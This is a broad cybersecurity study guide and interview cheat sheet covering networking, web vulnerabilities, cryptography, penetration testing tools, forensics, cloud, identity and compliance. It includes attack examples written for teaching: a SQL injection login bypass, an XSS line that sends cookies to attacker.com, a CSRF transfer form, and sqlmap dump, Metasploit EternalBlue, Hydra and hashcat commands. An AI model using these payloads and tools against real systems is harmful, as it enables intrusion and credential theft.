# Network Security

## TCP/IP Stack
**Purpose**: Foundation of internet communication
```
Application Layer: HTTP, HTTPS, FTP, SSH, DNS
Transport Layer: TCP, UDP
Network Layer: IP, ICMP, ARP
Data Link Layer: Ethernet, WiFi
Physical Layer: Cables, Radio waves
```

## Network Protocols
```bash
# TCP Handshake
1. SYN → 2. SYN-ACK → 3. ACK

# HTTP vs HTTPS
HTTP: Port 80, plaintext
HTTPS: Port 443, TLS encrypted

# DNS Resolution
dig example.com
nslookup example.com
```

## Firewalls & IDS/IPS
```bash
# iptables (Linux firewall)
iptables -A INPUT -p tcp --dport 22 -s 192.168.1.0/24 -j ACCEPT
iptables -A INPUT -p tcp --dport 22 -j DROP

# Snort rule (IDS)
alert tcp any any -> 192.168.1.0/24 80 (msg:"HTTP Attack"; content:"../"; sid:1001;)
```

## VPN Technologies
- **IPSec**: Network layer VPN, site-to-site
- **OpenVPN**: SSL/TLS based, flexible
- **WireGuard**: Modern, fast, minimal attack surface
```bash
# OpenVPN client config
client
remote vpn.example.com 1194
proto udp
cert client.crt
key client.key
```

# Web Application Security

## OWASP Top 10
1. **Injection**: SQL, NoSQL, LDAP, OS command injection
2. **Broken Authentication**: Session management flaws
3. **Sensitive Data Exposure**: Weak encryption, plaintext storage
4. **XML External Entities (XXE)**: XML parser vulnerabilities
5. **Broken Access Control**: Unauthorized resource access
6. **Security Misconfiguration**: Default settings, verbose errors
7. **Cross-Site Scripting (XSS)**: Client-side code injection
8. **Insecure Deserialization**: Object injection attacks
9. **Known Vulnerabilities**: Outdated components
10. **Insufficient Logging**: Poor monitoring and response

## SQL Injection
```sql
-- Vulnerable query
SELECT * FROM users WHERE username = '" + input + "' AND password = '" + password + "'

-- Attack payload
admin' OR '1'='1' --

-- Resulting query
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password = ''

-- Prevention: Parameterized queries
SELECT * FROM users WHERE username = ? AND password = ?
```

## Cross-Site Scripting (XSS)
```javascript
// Stored XSS
<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>

// Reflected XSS
http://vulnerable.com/search?q=<script>alert('XSS')</script>

// DOM-based XSS
document.getElementById('content').innerHTML = location.hash.substring(1);

// Prevention
function escapeHtml(text) {
  return text
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}
```

## Cross-Site Request Forgery (CSRF)
```html
<!-- Malicious form -->
<form action="http://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="1000">
</form>
<script>document.forms[0].submit();</script>

<!-- Prevention: CSRF token -->
<input type="hidden" name="_token" value="random_csrf_token">
```

## Content Security Policy (CSP)
CSP defines allowed content sources to mitigate XSS and data injection attacks.

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self'
```
* **default-src**: fallback
* **script-src/style-src/img-src**: allowed sources

## Strict-Transport-Security (HSTS)
The HSTS header ensures that web browsers will always connect over HTTPS.

```http
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```
* **max-age:** duration in seconds
* **includeSubDomains**: applies to all subdomains
* **preload**: eligible for browser preload lists

## X-Content-Type-Options
Prevents MIME type sniffing attacks by enforcing declared content types.

```http
X-Content-Type-Options: nosniff
```
* **nosniff**: browser must respect Content-Type header
* Prevents execution of non-executable MIME types

## Referrer-Policy
Controls how much referrer information is sent with requests.

```http
Referrer-Policy: strict-origin-when-cross-origin 
```
* **strict-origin-when-cross-origin:** full URL for same-origin, origin for cross-origin
* **strict-origin:** only origin for cross-origin requests
* **same-origin:** only for same-origin requests
* **no-referrer:** never send referrer

# Cryptography

## Symmetric Encryption
Symmetric encryption uses the same key for both encryption and decryption.

```python
# AES encryption
from cryptography.fernet import Fernet

# Generate key
key = Fernet.generate_key()
cipher = Fernet(key)

# Encrypt
message = b"Secret message"
encrypted = cipher.encrypt(message)

# Decrypt
decrypted = cipher.decrypt(encrypted)
```

## Asymmetric Encryption
Asymmetric encryption uses a pair of keys: a public key for encryption and a private key for decryption.

```bash
# RSA key generation
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem

# Encrypt with public key
openssl rsautl -encrypt -inkey public.pem -pubin -in message.txt -out encrypted.bin

# Decrypt with private key
openssl rsautl -decrypt -inkey private.pem -in encrypted.bin -out decrypted.txt
```

## Digital Signatures
Digital signatures merge authentication, integrity, and non-repudiation, enabling verification of a message or document's authenticity.

```python
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding

# Generate key pair
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048
)
public_key = private_key.public_key()

# Sign message
message = b"Important message"
signature = private_key.sign(
    message,
    padding.PSS(
        mgf=padding.MGF1(hashes.SHA256()),
        salt_length=padding.PSS.MAX_LENGTH
    ),
    hashes.SHA256()
)

# Verify signature
public_key.verify(
    signature,
    message,
    padding.PSS(
        mgf=padding.MGF1(hashes.SHA256()),
        salt_length=padding.PSS.MAX_LENGTH
    ),
    hashes.SHA256()
)
```

## Hashing
Hashing transforms data into a fixed-size string of characters, which is typically a digest that represents the original data.

```python
import hashlib

# SHA-256
message = "Hello World"
hash_object = hashlib.sha256(message.encode())
hash_hex = hash_object.hexdigest()

# Password hashing with salt
import bcrypt
password = "user_password"
salt = bcrypt.gensalt()
hashed = bcrypt.hashpw(password.encode(), salt)

# Verify password
bcrypt.checkpw(password.encode(), hashed)
```

# Penetration Testing

## Reconnaissance
```bash
# Subdomain enumeration
$ subfinder -d target.com
$ amass enum -d target.com

# Port scanning
$ nmap -sS -sV -O target.com       # Stealth scan with version detection and OS fingerprinting
$ nmap -sV -sC -p- target.com      # Scan all ports with default scripts and version detection

# Directory bruteforcing
$ dirb http://target.com /usr/share/wordlists/dirb/common.txt
$ gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# DNS enumeration
$ dig @8.8.8.8 target.com any     # Query all DNS records
$ nslookup -type=mx target.com    # Query MX records
$ fierce -dns target.com          # DNS reconnaissance
```

## Vulnerability Scanning
```bash
# Nessus scan
nessuscli -q localhost 8834 user pass scan new policy_id target_ip scan_name

# OpenVAS
openvas-cli -X '<create_task><name>Scan</name><target>target_ip</target></create_task>'

# Nikto web scanner
nikto -h http://target.com

# SQLmap
sqlmap.py -u "http://target.com/login" --dbs  # List databases
sqlmap.py -u "http://target.com/login" -D <database_name> --tables # List tables
sqlmap.py -u "http://target.com/login" -D <database_name> -T <table_name> --columns # List columns
sqlmap.py -u "http://target.com/login" -D <database_name> -T <table_name> -C <column_name> --dump # Dump data
```

## Exploitation Frameworks

### Metasploit
```bash
$ msfconsole                                      # Start Metasploit console
$ use exploit/windows/smb/ms17_010_eternalblue    # Select exploit
$ set RHOSTS target_ip                            # Set target IP
$ set LHOST attacker_ip                           # Set local IP  
$ exploit                                         # Launch exploit
```

### Burp Suite
Burp Suite is a popular web vulnerability scanner and proxy tool used for penetration testing of web applications.

Components:
- **Proxy**: Intercept and modify web traffic.
- **Target**: Define scope and map the application.
  
Features:
- **Intruder**: Automate fuzzing and brute-force attacks.
- **Repeater**: Edit and resend requests for testing.
- **Sequencer**: Analyze randomness (e.g., session tokens).
- **Decoder**: Encode/decode and transform data.
- **Comparer**: Compare responses or data sets.
- **Extender**: Add plugins and integrations.
- **Scanner**: Automated vulnerability scanning (Pro only).

<Details>
<summary>Burp Suite Commands & Usage</summary>

#### Intercept HTTP requests
To intercept and modify HTTP requests using Burp Suite, follow these steps:
1. Open Burp Suite and go to the "Proxy" tab.
2. Ensure "Intercept is on" (button should be highlighted).
3. Configure your browser to use Burp Suite as a proxy (default is localhost:8080).
4. Navigate to the target web application in your browser.
5. Burp Suite will capture the HTTP requests, allowing you to view and modify them before forwarding to the server.
6. After making modifications, click "Forward" in Burp Suite to send the request to the server.

#### Fuzzing with Intruder
1. Go to the "Intruder" tab and select "Positions".
2. Load a request (right-click in Proxy > Send to Intruder).
3. Clear existing payload positions and highlight the parts of the request you want to fuzz.
4. Click "Add §" to mark the positions.
5. Go to the "Payloads" tab, select the payload type (e.g., simple list, numbers, etc.), and load your payloads.
6. Click "Start attack" to begin fuzzing. Review the results for anomalies or vulnerabilities.

#### Repeating Requests with Repeater
1. Right-click on a request in the Proxy tab and select "Send to Repeater".
2. Go to the "Repeater" tab, where you can see the request.
3. Modify the request as needed (e.g., change parameters, headers).
4. Click "Send" to resend the modified request and view the response.

#### Analyzing Session Tokens with Sequencer
1. Right-click on a request containing a session token and select "Send to Sequencer".
2. Go to the "Sequencer" tab and start the analysis.
3. Review the results to assess the randomness and predictability of the token.

#### Decoding Data with Decoder
1. Go to the "Decoder" tab.
2. Paste the encoded data (e.g., Base64, URL-encoded).
3. Select the appropriate decoding method from the dropdown.
4. Click "Decode" to view the decoded data.

#### Comparing Responses with Comparer
1. Go to the "Comparer" tab.
2. Paste the first response in the left pane and the second response in the right pane.
3. Click "Compare" to see the differences highlighted.
</Details>

### OWASP ZAP
OWASP ZAP (Zed Attack Proxy) is a free, open-source web application security scanner.

**Core Features:**
- **Automated Scanner**: Passive and active scanning
- **Manual Tools**: Intercepting proxy, fuzzer, spider
- **API**: REST API for automation and CI/CD integration

```bash
# Basic scanning
$ zap-cli quick-scan http://target.com
$ zap-cli spider http://target.com
$ zap-cli active-scan http://target.com

# Advanced usage
$ zap.sh -cmd -quickurl http://target.com          # Quick scan via CLI
$ zap.sh -cmd -port 8080 -host 0.0.0.0             # Start daemon mode
$ zap.sh -cmd -quickprogress http://target.com     # Show scan progress

# API usage
curl "http://localhost:8080/JSON/spider/action/scan/?url=http://target.com"
curl "http://localhost:8080/JSON/ascan/action/scan/?url=http://target.com"
```

**ZAP Scripts:**
- **Authentication**: Custom login sequences
- **Session Management**: Handle complex session logic
- **Input Vectors**: Define custom attack points

# Incident Response

## NIST Framework
1. **Preparation**: Policies, procedures, tools
2. **Detection & Analysis**: Monitoring, investigation
3. **Containment**: Isolate threat, prevent spread
4. **Eradication**: Remove threat from environment
5. **Recovery**: Restore normal operations
6. **Lessons Learned**: Post-incident review

## Digital Forensics
Digital forensics involves the identification, preservation, analysis, and presentation of digital evidence.

```bash
# Memory dump
volatility -f memory.dump imageinfo
volatility -f memory.dump --profile=Win7SP1x64 pslist
volatility -f memory.dump --profile=Win7SP1x64 netscan

# Disk imaging
dd if=/dev/sda of=disk_image.dd bs=4K
ewfacquire /dev/sda -t evidence_file

# File analysis
file suspicious_file
strings suspicious_file
hexdump -C suspicious_file | head -20

# Network analysis
tcpdump -i eth0 -w capture.pcap                         # Capture all traffic
tcpdump -r capture.pcap 'port 80'                       # Read HTTP traffic
tcpdump -i eth0 'src host 192.168.1.1 and dst port 22'  # Filter SSH traffic

nc -l -p 4444                                            # Listen on port 4444
nc target.com 80                                        # Connect to target on port 80

wireshark capture.pcap                                  # Open capture in Wireshark
tshark -r capture.pcap -Y "http.request.method==POST"   # Filter POST requests
```

## Log Analysis
Log analysis is the process of reviewing and interpreting log files to identify security incidents, system errors, or performance issues.

```bash
# Apache logs
tail -f /var/log/apache2/access.log                 # Real-time log monitoring
grep "404" /var/log/apache2/access.log | head -10   # Find 404 errors

# System logs
journalctl -f                                       # Real-time system log monitoring  
grep "Failed password" /var/log/auth.log            # Failed SSH login attempts

# Windows Event Logs
Get-WinEvent -LogName Security | Where-Object {$_.Id -eq 4625}    # Failed login attempts
```

# Malware Analysis

## Static Analysis
Static analysis involves examining the code or binary of a program without executing it, to understand its structure, functionality, and potential malicious behavior.

```bash
# File information
file malware.exe
objdump -x malware.exe
strings malware.exe | grep -i "http\|ftp\|\.dll"

# Packing detection
peid malware.exe
upx -t malware.exe

# Hash calculation
md5sum malware.exe
sha256sum malware.exe

# VirusTotal API
curl -X POST 'https://www.virustotal.com/vtapi/v2/file/scan' -F 'key=YOUR_API_KEY' -F 'file=@malware.exe'
```

## Dynamic Analysis
Dynamic analysis involves executing the program in a controlled environment to observe its behavior, interactions, and effects on the system.

```bash
# Sandbox analysis
cuckoo submit malware.exe
cuckoo analysis info 1

# Process monitoring
strace -f -e trace=open,write,network ./malware
ltrace ./malware

# Network monitoring
netstat -tulpn
tcpdump -i any -w malware_traffic.pcap

# File system monitoring
inotifywait -m -r /tmp/
```

## Reverse Engineering
Reverse engineering is the process of analyzing a compiled program to understand its design, architecture, and functionality, often to identify vulnerabilities or malicious behavior.

```bash
# Disassembly
objdump -d malware.exe          # Disassemble binary
radare2 malware.exe             # Open in radare2
gdb malware.exe                 # Debugging with gdb

# Decompilation
retdec-decompiler malware.exe   # Decompile binary 
ghidra malware.exe              # Open in Ghidra to analyze code structure
```

# Cloud Security

## AWS Security
```bash
# IAM policies
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "s3:GetObject",
      "Resource": "arn:aws:s3:::my-bucket/*"
    }
  ]
}

# S3 bucket policy
aws s3api put-bucket-policy --bucket my-bucket --policy file://policy.json

# CloudTrail logs
aws logs describe-log-groups
aws logs filter-log-events --log-group-name CloudTrail --filter-pattern "ERROR"

# Security Groups
aws ec2 describe-security-groups
aws ec2 authorize-security-group-ingress --group-id sg-12345678 --protocol tcp --port 22 --cidr 10.0.0.0/8
```

## Container Security
```dockerfile
# Secure Dockerfile
FROM alpine:3.14
RUN adduser -D -s /bin/sh appuser
USER appuser
COPY --chown=appuser:appuser app /app
WORKDIR /app
CMD ["./app"]
```

```bash
# Docker security scanning
docker scan image:tag
trivy image image:tag

# Kubernetes security
kubectl get pods --all-namespaces
kubectl describe pod pod-name
kubectl logs pod-name

# Network policies
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-all
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
```

# Identity & Access Management
## General Concepts
- **Authentication**: Verifying identity (e.g., passwords, biometrics)
- **Authorization**: Granting access to resources based on permissions
- **Accounting**: Tracking user activities (logs, audits)
- **MFA (Multi-Factor Authentication)**: Using multiple methods to verify identity (e.g., password + OTP)
- **SSO (Single Sign-On)**: One set of credentials for multiple applications
- **OAuth**: Authorization framework for third-party access
- **OpenID Connect**: Identity layer on top of OAuth 2.0 for authentication
- **SAML (Security Assertion Markup Language)**: XML-based framework for exchanging authentication and authorization data
- **RBAC (Role-Based Access Control)**: Access based on user roles
- **IAM (Identity and Access Management)**: Framework for managing digital identities and access rights
- **Principle of Least Privilege**: Users get the minimum access necessary
- **Federation**: Trusting identities from external systems (e.g., SAML, OAuth)
- **Provisioning/Deprovisioning**: Creating/removing user accounts and access
- **Directory Services**: Centralized user and resource management (e.g., LDAP, Active Directory)
  
## Active Directory
An Active Directory (AD) domain is the basic security and administrative unit that groups related objects like users and computers under a single namespace (e.g., example.com), handling authentication and policies.

### **Logical Structure**
* **Domain** → A group of computers, users, and devices that share the same directory and security rules.
* **Tree** → A collection of related domains connected in a hierarchy under a single name.
* **Forest** → The highest level, containing multiple trees that work together but can have different rules.

### **AD Components**
* **Directory:** Hierarchical structure storing information about network objects (users, computers, devices).
* **Directory Service:** Provides methods for storing, retrieving, and managing directory data for network
users and administrators.
* **Domain Controller (DC)** → The server that runs AD. Stores the database (`NTDS.dit`) and handles authentication/authorization.
* * **Sites** → Physical locations with DCs. Help optimize replication and authentication traffic.
* * **Trusts** → Relationships between domains/forests to allow resource sharing.
* **Replication** → DCs sync with each other to stay updated.

### **Objects in AD**

* **Users** → Accounts representing people.
* **Groups** → Collections of users (or other groups). Used for permissions.
* **Computers** → Machine accounts for PCs and servers.
* **OUs (Organizational Units)** → Containers that organize objects (users, groups, computers). Like folders.
* **Group Policy Objects (GPOs)** → Rules applied to OUs (e.g., password complexity, desktop wallpaper, software install).

### **Authentication & Access**

* **Kerberos** → Default authentication protocol in AD (ticket-based).
  * **KRBTGT account:** Service account used by KDC to encrypt/decrypt TGTs.
  * **KDC (Key Distribution Center):** Issues tickets and manages keys. It consists of two main components:
    * **AS (Authentication Service):** Authenticates users and issues Ticket Granting Tickets (TGTs).
    * **TGS (Ticket Granting Service):** Issues service tickets based on a valid TGT for access to specific services.
  * **Tickets**
    * **TGT (Ticket Granting Ticket):** Provided by the KDC after initial authentication.
    * **Service Tickets:** Issued by the Ticket Granting Service (TGS) to access a specific resource or service. for accessing specific services.
  * **Attacks**
    * **Pass-the-Ticket (PtT):** Using stolen Kerberos tickets to access resources.
    * **Kerberoasting:**  Offline brute force of service account passwords from captured service tickets.
    * **Golden Ticket:** Forging TGT using the KRBTGT account’s hash from a compromised domain controller.
    * **Silver Ticket:** Forging service tickets using service account password hashes.
  * **SPN (Service Principal Name):** Unique identifier for services in Kerberos.
* **LDAP (Lightweight Directory Access Protocol)** → Protocol to query and modify AD data.
* **RADIUS** → Protocol that handles remote authentication and authorization (often for network access like VPNs or Wi-Fi)
* **NTLM** → Older fallback authentication protocol. Still used as a backup.

```powershell
# User management
New-ADUser -Name "John Doe" -SamAccountName "jdoe" -UserPrincipalName "jdoe@domain.com"
Get-ADUser -Filter "Name -like '*John*'"
Set-ADAccountPassword -Identity jdoe -Reset -NewPassword (ConvertTo-SecureString "NewPassword123!" -AsPlainText -Force)

# Group management
New-ADGroup -Name "Security Team" -GroupScope Global
Add-ADGroupMember -Identity "Security Team" -Members jdoe

# Password policy
Get-ADDefaultDomainPasswordPolicy
Set-ADDefaultDomainPasswordPolicy -MinPasswordLength 12 -PasswordHistoryCount 24
```

## LDAP
```bash
# LDAP search
ldapsearch -x -H ldap://dc.example.com -D "cn=admin,dc=example,dc=com" -W -b "dc=example,dc=com" "(objectClass=person)"

# Add user
ldapadd -x -H ldap://dc.example.com -D "cn=admin,dc=example,dc=com" -W -f newuser.ldif
```

## Single Sign-On (SSO)
SSO allows users to authenticate once and gain access to multiple systems without re-entering credentials.

### SAML (Security Assertion Markup Language)
SAML is an XML-based framework for exchanging authentication and authorization data between parties, typically an identity provider (IdP) and a service provider (SP).

```xml
<!-- SAML Assertion -->
<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
  <saml:Subject>
    <saml:NameID Format="urn:oasis:names:tc:SAML:2.0:nameid-format:persistent">user@example.com</saml:NameID>
  </saml:Subject>
  <saml:AttributeStatement>
    <saml:Attribute Name="Role">
      <saml:AttributeValue>Admin</saml:AttributeValue>
    </saml:Attribute>
  </saml:AttributeStatement>
</saml:Assertion>
```

### OAuth 2.0
OAuth 2.0 is an **authorization framework** (not for authentication) that allows third-party applications to obtain limited access to user resources without exposing user credentials → “app gets permission to act on your behalf.”

Client redirects user to AS with scope, client ID, etc.

```http
GET /authorize?
    client_id=123
    &redirect_uri=https://app/callback
    &response_type=code
    &scope=email
    &state=xyz
```
- `client_id` and `client_secret`: App credentials (Confidential or Public clients)
- `redirect_uri`: Where to send the user after authorization
- `scope`: Permissions requested
- `state`: Prevent CSRF attacks

User authenticates and consents to app, then Authorization Server (AS) redirects back to `redirect_uri` with code:
```http
https://app/callback?code=SplxlOBeZQQYbYS6WxSbIA&state=xyz
```

Client exchanges code for access (and optional refresh) token.

```json
POST /token
{
  "client_id": "123",
  "client_secret": "xyz",
  "code": "SplxlOBeZQQYbYS6WxSbIA",
  "grant_type": "authorization_code"
}
```
- `authorization_code`: Grant type for exchanging code for tokens

Response:

```json
{
  "access_token": "ya29.a0Af...",
  "expires_in": 3600,
  "refresh_token": "1//0g..."
}
```
- `access_token`: Short-lived; grants access to specific resources.
- `refresh_token`: Long-lived; allows new access tokens without re-consent.

Client uses access token to access Resource Server (RS).
```http
GET /userinfo
Authorization: Bearer ya29.a0Af...
```
- `Bearer`: Token type used in Authorization header (Anyone holding it can access resources)

**Enhancements:**
- `DPoP (Proof-of-Possession):` Bound to client's key pair; requires proof on each use.
  - Binds token to public key → prevents token misuse if intercepted.
  - Adds DPoP JWT header to prove possession.
- `PKCE (RFC 7636)`: Enhances security for public clients (e.g., mobile apps, SPAs).
  - Generates a random `code_verifier` and derives a `code_challenge` using SHA256.
  - Sends `code_challenge` during authorization request.
  - Sends `code_verifier` during token exchange to prove possession.


## OpenID Connect
OpenID Connect (OIDC) is an identity layer built on top of OAuth 2.0 that enables authentication and provides user profile information.

**Difference**: Response types include `id_token` for authentication (includes user identity through JWT).

Client initiates auth request to AS:
```http
GET /authorize?
    response_type=code
    &client_id=CLIENT_ID
    &redirect_uri=REDIRECT_URI
    &scope=openid%20profile%20email
    &state=STATE
```
- `scope=openid`: Required to indicate OIDC request
- `profile`, `email`: Request user profile and email information
- `id_token`: JWT containing user identity claims
- `userinfo` endpoint: Retrieve additional user info using access token

User authenticates and AS redirects back with code:
```http
https://app/callback?code=SplxlOBeZQQYbYS6WxSbIA&state=xyz
```
Client exchanges code for `id_token` and `access_token`:
```json
POST /token
{
  "client_id": "CLIENT_ID",
  "client_secret": "SECRET",
  "code": "SplxlOBeZQQYbYS6WxSbIA",
  "grant_type": "authorization_code"
}
```

Response:
```http
{
  "access_token": "ya29.a0Af...",
  "id_token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...",
  "token_type": "Bearer"
}
```

Inside `id_token`:
```json
{
  "sub": "1234567890",
  "name": "Berkan",
  "email": "berkan@example.com",
  "iss": "https://accounts.example.com",
  "aud": "CLIENT_ID",
  "exp": 1736854581
}
```
- `sub`: Unique user identifier
- `iss`: Issuer (AS)
- `aud`: Audience (client ID)
- `exp`: Expiration time
- `name`, `email`: User profile claims

Client uses `id_token` to authenticate user and `access_token` to access user info.


# Mobile Security

## Android Security
```java
// Permission check
if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
    ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.CAMERA}, CAMERA_REQUEST_CODE);
}

// Secure storage
SharedPreferences sharedPrefs = getSharedPreferences("secure_prefs", Context.MODE_PRIVATE);
SharedPreferences.Editor editor = sharedPrefs.edit();
editor.putString("api_key", encryptedApiKey);
editor.apply();

// Certificate pinning
CertificatePinner certificatePinner = new CertificatePinner.Builder()
    .add("example.com", "sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=")
    .build();
```

## iOS Security
```swift
// Keychain storage
let query: [String: Any] = [
    kSecClass as String: kSecClassGenericPassword,
    kSecAttrAccount as String: "userAccount",
    kSecValueData as String: password.data(using: .utf8)!
]
SecItemAdd(query as CFDictionary, nil)

// App Transport Security
<key>NSAppTransportSecurity</key>
<dict>
    <key>NSAllowsArbitraryLoads</key>
    <false/>
</dict>
```

# Compliance & Governance

## GDPR
- **Data Protection Principles**: Lawfulness, fairness, transparency
- **Rights**: Access, rectification, erasure, portability
- **Data Protection Impact Assessment (DPIA)**
- **Breach notification**: 72 hours to authorities

## PCI DSS
**Requirements**
1. Firewall configuration
2. Default passwords
3. Cardholder data protection
4. Encrypted transmission
5. Antivirus software
6. Secure systems
7. Access control
8. Unique IDs
9. Physical access
10. Network monitoring
11. Regular testing
12. Security policy

## ISO 27001
- **ISMS**: Information Security Management System
- **Risk Assessment**: Identify, analyze, evaluate risks
- **Controls**: Technical, organizational, physical

# Password Attacks
Password attacks aim to compromise user credentials through various techniques.

```bash
# Hashcat - Indexes and cracks password hashes using different algorithms and attack modes. 
hashcat -m 0 hashes.txt wordlist.txt
hashcat -m 1000 ntlm_hashes.txt wordlist.txt
hashcat -a 3 -m 0 hash.txt ?d?d?d?d?d?d?d?d

# John the Ripper - A fast password cracker supporting various hash types and customizable rules.
john --wordlist=wordlist.txt hashes.txt
john --rules --wordlist=wordlist.txt hashes.txt
john --show hashes.txt

# Hydra - Online brute-force tool for various protocols (SSH, FTP, HTTP, etc.).
hydra -L users.txt -P passwords.txt ssh://target.com
hydra -l admin -P passwords.txt http-post-form://target.com/login.php:"username=^USER^&password=^PASS^:F=incorrect"
```

## Forensics Tools
```bash
# Autopsy
autopsy

# Sleuth Kit
fls -r disk_image.dd
icat disk_image.dd 1234 > recovered_file.txt

# Volatility
volatility -f memory.dump --profile=Win7SP1x64 pslist
volatility -f memory.dump --profile=Win7SP1x64 connections
volatility -f memory.dump --profile=Win7SP1x64 malfind
```

# Common Interview Questions

## Network Security
- **TCP vs UDP**: Connection-oriented vs connectionless
- **SSL/TLS Handshake**: Certificate exchange, key agreement
- **VPN Types**: Site-to-site, remote access, SSL VPN
- **Firewall Types**: Packet filtering, stateful, application layer

## Web Security
- **OWASP Top 10**: Most critical web vulnerabilities
- **XSS Types**: Stored, reflected, DOM-based
- **CSRF Protection**: Tokens, same-site cookies
- **SQL Injection**: Prevention with parameterized queries

## Cryptography
- **Symmetric vs Asymmetric**: Speed vs key distribution
- **Hash Functions**: MD5, SHA-1, SHA-256 properties
- **Digital Signatures**: Authentication, non-repudiation
- **PKI**: Certificate authorities, trust chains

## Incident Response
- **NIST Framework**: Prepare, detect, contain, eradicate, recover
- **Evidence Handling**: Chain of custody, forensics procedures
- **Log Analysis**: SIEM, correlation, threat hunting
- **Communication**: Internal teams, external stakeholders

## Risk Management
- **Risk Assessment**: Threat, vulnerability, impact
- **Risk Treatment**: Accept, avoid, mitigate, transfer
- **Compliance**: GDPR, PCI DSS, HIPAA, SOX
- **Business Continuity**: Disaster recovery, backup strategies

## Access Control
- **AAA**: Authentication, authorization, accounting
- **Identity Federation**: SAML, OAuth, OpenID Connect
- **Privilege Escalation**: Vertical vs horizontal
- **Zero Trust**: Never trust, always verify

## Malware Analysis
- **Static vs Dynamic**: Code analysis vs runtime behavior
- **Packing**: Code obfuscation techniques
- **Indicators of Compromise**: Files, network, registry
- **Sandboxing**: Isolated execution environments

This comprehensive guide covers essential cybersecurity concepts, tools, and techniques for defensive security operations and interview preparation.